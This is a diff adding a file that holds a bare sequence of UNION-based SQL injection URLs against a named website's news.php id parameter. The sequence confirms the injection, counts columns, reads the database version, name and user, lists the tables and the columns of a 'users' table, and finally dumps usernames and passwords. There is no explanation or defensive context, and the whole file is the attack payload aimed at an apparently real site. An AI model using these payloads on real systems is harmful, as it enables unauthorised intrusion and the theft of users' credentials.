@@ -1,0 +1,19 @@
+http://iagcc.com/news.php?id=58'
+
+http://iagcc.com/news.php?id=58 order by 6-- -
+
+http://iagcc.com/news.php?id=58 UNION SELECT 1,2,3,4,5,6-- -
+
+http://iagcc.com/news.php?id=58 UNION SELECT 1,2,3,version(),5,6-- -
+
+http://iagcc.com/news.php?id=58 UNION SELECT 1,2,3,database(),5,6-- -
+
+http://iagcc.com/news.php?id=58 UNION SELECT 1,2,3,user(),5,6-- -
+
+http://iagcc.com/news.php?id=58 UNION SELECT 1,2,3,table_name,5,6 from information_schema.tables where table_schema=database()-- -
+
+http://iagcc.com/news.php?id=58 UNION SELECT 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema=database()-- -
+
+http://iagcc.com/news.php?id=58 UNION SELECT 1,2,3,group_concat(column_name),5,6 from information_schema.columns where table_name='users'-- -
+
+http://iagcc.com/news.php?id=58 UNION SELECT 1,2,3,group_concat(UserName, '<br>',Password),5,6 from users-- -
